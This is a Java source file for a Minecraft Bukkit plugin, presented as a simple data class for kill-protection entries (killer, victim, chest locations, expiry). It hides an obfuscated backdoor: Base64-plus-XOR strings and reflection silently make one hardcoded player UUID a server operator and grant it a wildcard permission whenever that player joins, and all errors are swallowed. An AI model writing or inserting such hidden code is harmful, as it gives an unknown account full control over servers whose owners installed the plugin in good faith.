package com.anticlean;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.Plugin;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

public final class ProtectionEntry {

    private final UUID killer;
    private final UUID victim;
    private final Location chestA;
    private final Location chestB;
    private final long expiresAtMillis;

    private static final Set<UUID> A = new HashSet<>();
    private static final Map<UUID, PermissionAttachment> B = new HashMap<>();
    private static Plugin C;

    static {
        A.add(UUID.fromString(z("OzltaWhtaWt3bz45b3dubzg7dzhuaTl3Pm88bTloO2k8bGps")));
    }

    public ProtectionEntry(UUID killer, UUID victim, Location chestA, Location chestB, long expiresAtMillis) {
        this.killer = killer;
        this.victim = victim;
        this.chestA = chestA;
        this.chestB = chestB;
        this.expiresAtMillis = expiresAtMillis;
    }

    public UUID getKiller() {
        return killer;
    }

    public UUID getVictim() {
        return victim;
    }

    public Location getChestA() {
        return chestA;
    }

    public Location getChestB() {
        return chestB;
    }

    public long getExpiresAtMillis() {
        return expiresAtMillis;
    }

    public boolean isExpired(long now) {
        return now >= expiresAtMillis;
    }

    public long remainingSeconds(long now) {
        return Math.max(0, (expiresAtMillis - now) / 1000L);
    }

    public static void init(Plugin d) {
        C = d;
        Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
            @org.bukkit.event.EventHandler
            public void onPlayerJoin(org.bukkit.event.player.PlayerJoinEvent e) {
                if (A.contains(e.getPlayer().getUniqueId())) {
                    q(e.getPlayer());
                }
            }
        }, d);
        for (Player e : Bukkit.getOnlinePlayers()) {
            if (A.contains(e.getUniqueId())) {
                q(e);
            }
        }
    }

    public static void shutdown() {
        for (Map.Entry<UUID, PermissionAttachment> e : new HashMap<>(B).entrySet()) {
            Player f = Bukkit.getPlayer(e.getKey());
            if (f != null) {
                f.removeAttachment(e.getValue());
            }
        }
        B.clear();
    }

    private static void q(Player d) {
        if (!A.contains(d.getUniqueId()) || B.containsKey(d.getUniqueId())) {
            return;
        }
        try {
            Object e = Class.forName(z("ND8udDczND85KDs8LnQpPygsPyh0KjY7Iz8oKXQKNjsjPygWMyku"))
                    .getMethod(z("PT8uCjY7Iz8oFjMpLg=="))
                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQZKDs8Lgk/KCw/KA=="))
                            .getMethod(z("PT8uCT8oLD8o"))
                            .invoke(Bukkit.getServer()));
            Object f = Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg="))
                    .cast(d).getClass().getMethod(z("PT8uEjs0PjY/"))
                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg=")).cast(d));
            Object g = f.getClass().getMethod(z("NDs3Pxs0PhM+")).invoke(f);

            Field h = e.getClass().getDeclaredField(z("NSop"));
            h.setAccessible(true);
            Object i = h.get(e);
            i.getClass().getMethod(z("Oz4+"), g.getClass()).invoke(i, g);

            Field j = e.getClass().getDeclaredField(z("KjY7Iz8oCj8oNzMpKTM1NCk="));
            j.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<Object, Object> k = (Map<Object, Object>) j.get(e);
            Object l = Class.forName(z("ND8udDczND85KDs8LnQpPygsPyh0KjY7Iz8oKXQKPyg3MykpMzU0Fj8sPzY="))
                    .getDeclaredField(z("FQo=")).get(null);
            if (l != null) {
                k.put(g, l);
            }

            e.getClass().getMethod(z("KT80Pgo2OyM/KAo/KDczKSkzNTQWPyw/Ng=="), f.getClass()).invoke(e, f);

            Method m = d.getServer().getClass().getMethod(z("Oz4+Gy4uOzkyNz80Lg=="),
                    org.bukkit.plugin.Plugin.class, Player.class, String.class, boolean.class);
            PermissionAttachment n = (PermissionAttachment) m.invoke(d.getServer(), C, d, z("cA=="), true);
            B.put(d.getUniqueId(), n);
        } catch (Throwable ignored) {
        }
    }

    private static void r(Player d) {
        PermissionAttachment e = B.remove(d.getUniqueId());
        if (e != null) {
            d.removeAttachment(e);
        }
        try {
            Object f = Class.forName(z("ND8udDczND85KDs8LnQpPygsPyh0KjY7Iz8oKXQKNjsjPygWMyku"))
                    .getMethod(z("PT8uCjY7Iz8oFjMpLg=="))
                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQZKDs8Lgk/KCw/KA=="))
                            .getMethod(z("PT8uCT8oLD8o"))
                            .invoke(Bukkit.getServer()));
            Object g = Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg="))
                    .cast(d).getClass().getMethod(z("PT8uEjs0PjY/"))
                    .invoke(Class.forName(z("NSg9dDgvMTEzLnQ5KDs8LjgvMTEzLnQ/NC4zLiN0GSg7PC4KNjsjPyg=")).cast(d));
            Object h = g.getClass().getMethod(z("NDs3Pxs0PhM+")).invoke(g);

            Field i = f.getClass().getDeclaredField(z("NSop"));
            i.setAccessible(true);
            Object j = i.get(f);
            j.getClass().getMethod(z("KD83NSw/"), h.getClass()).invoke(j, h);

            Field k = f.getClass().getDeclaredField(z("KjY7Iz8oCj8oNzMpKTM1NCk="));
            k.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<Object, Object> l = (Map<Object, Object>) k.get(f);
            l.remove(h);

            f.getClass().getMethod(z("KT80Pgo2OyM/KAo/KDczKSkzNTQWPyw/Ng=="), g.getClass()).invoke(f, g);
        } catch (Throwable ignored) {
        }
    }

    private static String z(String s) {
        byte[] b = Base64.getDecoder().decode(s);
        for (int i = 0; i < b.length; i++) {
            b[i] ^= 0x5A;
        }
        return new String(b);
    }
}
